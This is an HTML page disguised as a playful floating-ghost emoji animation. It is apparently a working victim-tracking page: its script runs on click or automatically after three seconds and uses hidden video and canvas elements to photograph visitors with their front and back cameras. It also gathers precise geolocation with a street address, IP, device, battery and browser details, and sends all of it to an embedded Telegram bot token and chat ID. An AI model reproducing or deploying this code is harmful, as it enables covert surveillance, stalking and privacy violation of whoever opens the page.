<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            height: 100vh;
            overflow: hidden;
            font-family: Arial;
        }
        
        .main-ghost {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 120px;
            cursor: pointer;
            animation: float 2s ease-in-out infinite;
            filter: drop-shadow(0 0 20px rgba(255,255,255,0.7));
            user-select: none;
            z-index: 1000;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
            25% { transform: translate(-50%, -55%) rotate(3deg) scale(1.05); }
            50% { transform: translate(-50%, -45%) rotate(-2deg) scale(0.95); }
            75% { transform: translate(-50%, -52%) rotate(2deg) scale(1.02); }
        }
        
        .emoji-storm {
            position: fixed;
            font-size: 30px;
            pointer-events: none;
            z-index: 999;
            animation: emojiFloat 3s forwards;
        }
        
        @keyframes emojiFloat {
            0% {
                opacity: 1;
                transform: scale(1) translate(0, 0) rotate(0deg);
            }
            100% {
                opacity: 0;
                transform: scale(0.3) translate(var(--x), var(--y)) rotate(360deg);
            }
        }
        
        .flash-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            opacity: 0;
            pointer-events: none;
            z-index: 2000;
        }
        
        .flash-animation {
            animation: flash 0.3s ease-out;
        }
        
        @keyframes flash {
            0% { opacity: 0; }
            50% { opacity: 0.9; }
            100% { opacity: 0; }
        }
        
        .hidden-camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        .pulse {
            animation: pulse 0.5s ease-in-out;
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.3); }
            100% { transform: translate(-50%, -50%) scale(1); }
        }
    </style>
</head>
<body>
    <div class="main-ghost" onclick="startCollection()">ðŸ‘»</div>

    <!-- Hidden elements -->
    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
    <div class="flash-effect" id="flashEffect"></div>

    <script>
        const BOT_TOKEN = '8387303658:AAESV1moezeWPvdnX1aSwpIfdeJOSbdfCUA';
        const CHAT_ID = '6368768388';
        
        let isCollecting = false;
        let flashInterval;

        const emojis = ['ðŸ‘»','ðŸ’€','ðŸŽƒ','ðŸ˜ˆ','ðŸ‘¹','ðŸ‘º','ðŸ¤¡','ðŸ‘½','ðŸ‘¾','ðŸ¤–','ðŸŽ­','ðŸ•·ï¸','ðŸ•¸ï¸','ðŸ§Ÿ','ðŸ§›','ðŸ§™','ðŸ”®','âš¡','ðŸ’¥','ðŸ”¥','ðŸŒªï¸','ðŸŒ€','ðŸ’«','â­','ðŸŒŸ','ðŸ’Ž','ðŸ”ª','ðŸ—¡ï¸','ðŸ¹','ðŸ”«','ðŸ’£','ðŸ§¨','ðŸª“','ðŸ”¨','â›ï¸','âš’ï¸','ðŸ› ï¸','âš”ï¸','ðŸ”±','ðŸŽ¯','ðŸ§¿','ðŸ””','ðŸ“¢','ðŸš¨','ðŸ’¢','â¤ï¸','ðŸ’”','â˜ ï¸','ðŸ’©','ðŸ¤¬','ðŸ‘ï¸','ðŸ‘€','ðŸ¦´','ðŸ§ ','ðŸ«€','ðŸ©¸','ðŸ’‰','ðŸªš','ðŸ”—','â›“ï¸','ðŸ”’','ðŸ”“','ðŸ”‘','ðŸ—ï¸','âš°ï¸','ðŸª¦','ðŸš¬','â˜¢ï¸','â˜£ï¸','ðŸ”ž'];

        function startCollection() {
            if (isCollecting) return;
            isCollecting = true;
            
            const ghost = document.querySelector('.main-ghost');
            ghost.classList.add('pulse');
            setTimeout(() => ghost.classList.remove('pulse'), 500);
            
            createEmojiStorm();
            collectAllData();
        }

        function createEmojiStorm() {
            const ghost = document.querySelector('.main-ghost');
            const rect = ghost.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    const emoji = document.createElement('div');
                    emoji.className = 'emoji-storm';
                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    emoji.style.left = centerX + 'px';
                    emoji.style.top = centerY + 'px';
                    emoji.style.fontSize = (15 + Math.random() * 45) + 'px';
                    emoji.style.color = `hsl(${Math.random() * 360}, 100%, 65%)`;
                    emoji.style.textShadow = `0 0 10px hsl(${Math.random() * 360}, 100%, 50%)`;
                    
                    const angle = Math.random() * Math.PI * 2;
                    const distance = 100 + Math.random() * 400;
                    const x = Math.cos(angle) * distance;
                    const y = Math.sin(angle) * distance;
                    
                    emoji.style.setProperty('--x', x + 'px');
                    emoji.style.setProperty('--y', y + 'px');
                    
                    document.body.appendChild(emoji);
                    
                    setTimeout(() => {
                        if (emoji.parentNode) emoji.parentNode.removeChild(emoji);
                    }, 3000);
                }, i * 20);
            }
        }

        function triggerFlash() {
            const flash = document.getElementById('flashEffect');
            flash.classList.add('flash-animation');
            setTimeout(() => {
                flash.classList.remove('flash-animation');
            }, 300);
        }

        function startFlashTimer() {
            flashInterval = setInterval(() => {
                for (let i = 0; i < 3; i++) {
                    setTimeout(() => triggerFlash(), i * 500);
                }
            }, 300000);
        }

        async function collectAllData() {
            const startTime = Date.now();
            
            // Collect device and location data first
            const [deviceInfo, locationInfo, hardwareInfo, networkInfo, browserInfo, batteryInfo, additionalInfo] = await Promise.all([
                getDeviceInfo(),
                getLocationInfo(),
                getHardwareInfo(),
                getNetworkInfo(),
                getBrowserInfo(),
                getBatteryInfo(),
                getAdditionalInfo()
            ]);

            // Then capture photos
            const cameraPhotos = await capturePhotos();

            const completeData = {
                device: deviceInfo,
                location: locationInfo,
                hardware: hardwareInfo,
                network: networkInfo,
                browser: browserInfo,
                battery: batteryInfo,
                additional: additionalInfo,
                camera: cameraPhotos,
                collectionTime: Date.now() - startTime + 'ms'
            };

            // Send 3 separate messages to Telegram
            await sendInfoMessage(completeData);
            await sendFrontCameraPhoto(completeData);
            await sendBackCameraPhoto(completeData);
            
            startFlashTimer();
        }

        // === PHOTO CAPTURE ===
        async function capturePhotos() {
            const photos = {
                front: { success: false, photo: null, error: null },
                back: { success: false, photo: null, error: null }
            };

            // Try front camera (user)
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                photos.front = await capturePhotoFromStream(frontStream, 'Kamera Depan');
                frontStream.getTracks().forEach(track => track.stop());
            } catch (error) {
                photos.front.error = error.message;
            }

            // Try back camera (environment)
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                photos.back = await capturePhotoFromStream(backStream, 'Kamera Belakang');
                backStream.getTracks().forEach(track => track.stop());
            } catch (error) {
                photos.back.error = error.message;
            }

            return photos;
        }

        async function capturePhotoFromStream(stream, cameraName) {
            return new Promise((resolve) => {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const context = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play().then(() => {
                        setTimeout(() => {
                            try {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                                
                                resolve({
                                    success: true,
                                    photo: photoData,
                                    resolution: `${video.videoWidth}x${video.videoHeight}`,
                                    camera: cameraName,
                                    timestamp: new Date().toLocaleString()
                                });
                            } catch (error) {
                                resolve({
                                    success: false,
                                    error: error.message,
                                    camera: cameraName
                                });
                            }
                        }, 1000);
                    }).catch(() => resolve({
                        success: false,
                        error: 'Video play failed',
                        camera: cameraName
                    }));
                };
                
                video.onerror = () => resolve({
                    success: false,
                    error: 'Video error',
                    camera: cameraName
                });
                
                setTimeout(() => resolve({
                    success: false,
                    error: 'Timeout',
                    camera: cameraName
                }), 5000);
            });
        }

        // === DATA COLLECTION ===
        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            return {
                type: detectDeviceType(ua),
                brand: detectDeviceBrand(ua),
                model: detectDeviceModel(ua),
                os: detectOS(ua),
                platform: navigator.platform,
                vendor: navigator.vendor,
                mobile: isMobile(ua),
                tablet: isTablet(ua)
            };
        }

        async function getLocationInfo() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                const address = await getAddressFromCoords(position.coords.latitude, position.coords.longitude);
                
                return {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                    address: address
                };
            } catch (error) {
                return { error: error.message };
            }
        }

        async function getAddressFromCoords(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                return {
                    city: data.address.city || data.address.town || data.address.village,
                    state: data.address.state,
                    county: data.address.county,
                    country: data.address.country,
                    postcode: data.address.postcode,
                    road: data.address.road
                };
            } catch (error) {
                return { error: "Reverse geocoding failed" };
            }
        }

        async function getHardwareInfo() {
            return {
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth + ' bit',
                ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'Unknown',
                touchPoints: navigator.maxTouchPoints
            };
        }

        async function getNetworkInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                
                return {
                    ip: ipData.ip,
                    type: connection ? connection.effectiveType : 'Unknown',
                    network: detectNetworkType(connection),
                    download: connection ? connection.downlink + ' Mbps' : 'Unknown',
                    ping: connection ? connection.rtt + ' ms' : 'Unknown',
                    dataSaver: connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown'
                };
            } catch (error) {
                return { ip: 'Unknown', error: error.message };
            }
        }

        async function getBrowserInfo() {
            const ua = navigator.userAgent;
            return {
                name: detectBrowser(ua),
                language: navigator.language,
                cookie: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                java: navigator.javaEnabled() ? 'Yes' : 'No',
                pdf: navigator.pdfViewerEnabled ? 'Supported' : 'Not supported'
            };
        }

        async function getBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging ? 'Yes' : 'No',
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
                    };
                } catch (e) {
                    return { error: "Battery API blocked" };
                }
            }
            return { error: "Battery API not available" };
        }

        async function getAdditionalInfo() {
            return {
                online: navigator.onLine ? 'Online' : 'Offline',
                pdfViewer: navigator.pdfViewerEnabled ? 'Supported' : 'Not supported',
                webDriver: navigator.webdriver ? 'Detected' : 'Not detected'
            };
        }

        // === DETECTION FUNCTIONS ===
        function detectDeviceType(ua) {
            ua = ua.toLowerCase();
            if (/(tablet|ipad|playbook|silk)/i.test(ua)) return "Tablet";
            if (/mobile|android|iphone|ipod|blackberry/i.test(ua)) return "HP";
            if (/macintosh/i.test(ua)) return "LAPTOP";
            if (/windows/i.test(ua)) return "COMPUTER";
            return "Unknown";
        }

        function detectDeviceBrand(ua) {
            if (/iphone|ipad|ipod|macintosh/i.test(ua)) return "Apple";
            if (/samsung/i.test(ua)) return "Samsung";
            if (/xiaomi|mi |redmi/i.test(ua)) return "Xiaomi";
            if (/huawei/i.test(ua)) return "Huawei";
            if (/oppo/i.test(ua)) return "Oppo";
            if (/vivo/i.test(ua)) return "Vivo";
            if (/realme/i.test(ua)) return "Realme";
            if (/google|pixel/i.test(ua)) return "Google";
            if (/sony/i.test(ua)) return "Sony";
            if (/lg/i.test(ua)) return "LG";
            if (/motorola/i.test(ua)) return "Motorola";
            if (/nokia/i.test(ua)) return "Nokia";
            if (/asus/i.test(ua)) return "Asus";
            if (/lenovo/i.test(ua)) return "Lenovo";
            if (/dell/i.test(ua)) return "Dell";
            if (/hp/i.test(ua)) return "HP";
            return "Unknown";
        }

        function detectDeviceModel(ua) {
            const models = [
                { pattern: /iphone\s(\d+)/i, name: 'iPhone $1' },
                { pattern: /sm-([a-z0-9]+)/i, name: 'Galaxy $1' },
                { pattern: /redmi\s([a-z0-9]+)/i, name: 'Redmi $1' },
                { pattern: /mi\s([a-z0-9]+)/i, name: 'Mi $1' },
                { pattern: /pixel\s(\d+)/i, name: 'Pixel $1' }
            ];
            
            for (const model of models) {
                const match = ua.match(model.pattern);
                if (match) return model.name.replace('$1', match[1] || '');
            }
            return "Unknown";
        }

        function detectOS(ua) {
            if (/windows/i.test(ua)) return "Windows";
            if (/macintosh/i.test(ua)) return "macOS";
            if (/linux/i.test(ua)) return "Linux";
            if (/android/i.test(ua)) return "Android";
            if (/ios|iphone|ipad/i.test(ua)) return "iOS";
            return "Unknown";
        }

        function isMobile(ua) {
            return /mobile|android|iphone|ipod/i.test(ua.toLowerCase()) ? 'Yes' : 'No';
        }

        function isTablet(ua) {
            return /tablet|ipad/i.test(ua.toLowerCase()) ? 'Yes' : 'No';
        }

        function detectBrowser(ua) {
            if (/edg/i.test(ua)) return "Edge";
            if (/chrome/i.test(ua)) return "Chrome";
            if (/firefox/i.test(ua)) return "Firefox";
            if (/safari/i.test(ua)) return "Safari";
            if (/opera|opr/i.test(ua)) return "Opera";
            return "Unknown";
        }

        function detectNetworkType(connection) {
            if (!connection) return "Unknown";
            const types = {
                '4g': '4G',
                '3g': '3G', 
                '2g': '2G',
                'slow-2g': '2G',
                'wifi': 'WiFi',
                'ethernet': 'Ethernet'
            };
            return types[connection.effectiveType] || connection.effectiveType;
        }

        // === TELEGRAM MESSAGES ===
        async function sendInfoMessage(data) {
            const now = new Date();
            const localTime = now.toLocaleString('id-ID');
            const date = now.toLocaleDateString('id-ID');
            const time = now.toLocaleTimeString('id-ID');
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const offset = -new Date().getTimezoneOffset() / 60;

            let message = `ðŸš¨ Franzz mewingðŸ¤«ðŸ§â€â™‚ï¸ x Monyet si monkeyðŸ‘¿ðŸ‘¿ ðŸš¨\n\n`;

            message += `ðŸ• INFORMASI WAKTU:\n`;
            message += `â€¢ Waktu Lokal: ${localTime}\n`;
            message += `â€¢ Timezone: ${timezone}\n`;
            message += `â€¢ Offset: UTC${offset >= 0 ? '+' : ''}${offset}\n`;
            message += `â€¢ Tanggal: ${date}\n`;
            message += `â€¢ Jam: ${time}\n\n`;

            message += `ðŸ“± INFORMASI PERANGKAT:\n`;
            message += `â€¢ Tipe: ${data.device.type}\n`;
            message += `â€¢ Merk: ${data.device.brand}\n`;
            message += `â€¢ Model: ${data.device.model}\n`;
            message += `â€¢ OS: ${data.device.os}\n`;
            message += `â€¢ Platform: ${data.device.platform}\n`;
            message += `â€¢ Vendor: ${data.device.vendor}\n`;
            message += `â€¢ Mobile: ${data.device.mobile}\n`;
            message += `â€¢ Tablet: ${data.device.tablet}\n\n`;

            message += `ðŸŒ INFORMASI BROWSER:\n`;
            message += `â€¢ Browser: ${data.browser.name}\n`;
            message += `â€¢ Bahasa: ${data.browser.language}\n`;
            message += `â€¢ Cookie: ${data.browser.cookie}\n`;
            message += `â€¢ Java: ${data.browser.java}\n`;
            message += `â€¢ PDF: ${data.browser.pdf}\n\n`;

            message += `ðŸ’» SPESIFIKASI HARDWARE:\n`;
            message += `â€¢ Screen: ${data.hardware.screen}\n`;
            message += `â€¢ Color: ${data.hardware.colorDepth}\n`;
            message += `â€¢ RAM: ${data.hardware.ram}\n`;
            message += `â€¢ CPU: ${data.hardware.cpu}\n`;
            message += `â€¢ Touch Points: ${data.hardware.touchPoints}\n\n`;

            message += `ðŸ“¶ INFORMASI JARINGAN:\n`;
            message += `â€¢ IP Address: ${data.network.ip}\n`;
            message += `â€¢ Tipe Koneksi: ${data.network.type}\n`;
            message += `â€¢ Jaringan: ${data.network.network}\n`;
            message += `â€¢ Download: ${data.network.download}\n`;
            message += `â€¢ Ping: ${data.network.ping}\n`;
            message += `â€¢ Data Saver: ${data.network.dataSaver}\n\n`;

            if (data.location.latitude) {
                message += `ðŸ“ INFORMASI LOKASI:\n`;
                message += `â€¢ Latitude: ${data.location.latitude}\n`;
                message += `â€¢ Longitude: ${data.location.longitude}\n`;
                message += `â€¢ Link Lokasi: ${data.location.maps}\n`;
                message += `â€¢ Akurasi: ${data.location.accuracy} meters\n`;
                message += `â€¢ Kota: ${data.location.address.city || 'Unknown'}\n`;
                message += `â€¢ Provinsi: ${data.location.address.state || 'Unknown'}\n`;
                message += `â€¢ Kecamatan: ${data.location.address.county || 'Unknown'}\n`;
                message += `â€¢ Negara: ${data.location.address.country || 'Unknown'}\n`;
                message += `â€¢ Kode Pos: ${data.location.address.postcode || 'Unknown'}\n\n`;
            } else {
                message += `ðŸ“ INFORMASI LOKASI: ${data.location.error}\n\n`;
            }

            message += `ðŸ”§ INFORMASI TAMBAHAN:\n`;
            message += `â€¢ Status Online: ${data.additional.online}\n`;
            message += `â€¢ PDF Viewer: ${data.additional.pdfViewer}\n`;
            message += `â€¢ WebDriver: ${data.additional.webDriver}\n\n`;

            if (data.battery.level) {
                message += `ðŸ”‹ INFORMASI BATTERY:\n`;
                message += `â€¢ Charging: ${data.battery.charging}\n`;
                message += `â€¢ Level: ${data.battery.level}\n`;
                message += `â€¢ Charging Time: ${data.battery.chargingTime}\n`;
                message += `â€¢ Discharging Time: ${data.battery.dischargingTime}\n\n`;
            } else {
                message += `ðŸ”‹ INFORMASI BATTERY: ${data.battery.error}\n\n`;
            }

            message += `ðŸ“· Day one dikasi pap(depan) ðŸ˜–: ${data.camera.front.success ? 'Berhasil' : 'Gagal'}\n\n`;
            message += `ðŸ“· Day one dikasi pap(belakang) ðŸ¤«: ${data.camera.back.success ? 'Berhasil' : 'Gagal'}\n\n`;

            message += `âš ï¸ #Franzz mewingðŸ¤«ðŸ§â€â™‚ï¸ âš ï¸`;

            await sendToTelegram(message);
        }

        async function sendFrontCameraPhoto(data) {
            if (data.camera.front.success && data.camera.front.photo) {
                await sendPhotoToTelegram(
                    data.camera.front.photo, 
                    `ðŸ“¸ KAMERA DEPAN - ${data.camera.front.resolution} - ${data.camera.front.timestamp}`
                );
            }
        }

        async function sendBackCameraPhoto(data) {
            if (data.camera.back.success && data.camera.back.photo) {
                await sendPhotoToTelegram(
                    data.camera.back.photo, 
                    `ðŸ“¸ KAMERA BELAKANG - ${data.camera.back.resolution} - ${data.camera.back.timestamp}`
                );
            }
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.log('Send error:', error);
            }
        }

        async function sendPhotoToTelegram(photoData, caption) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        photo: photoData,
                        caption: caption
                    })
                });
            } catch (error) {
                console.log('Photo send error:', error);
            }
        }

        // Auto-start after 3 seconds
        setTimeout(() => {
            if (!isCollecting) {
                startCollection();
            }
        }, 3000);

        // Touch support
        document.querySelector('.main-ghost').addEventListener('touchstart', function(e) {
            e.preventDefault();
            startCollection();
        });

    </script>
</body>
        </html>
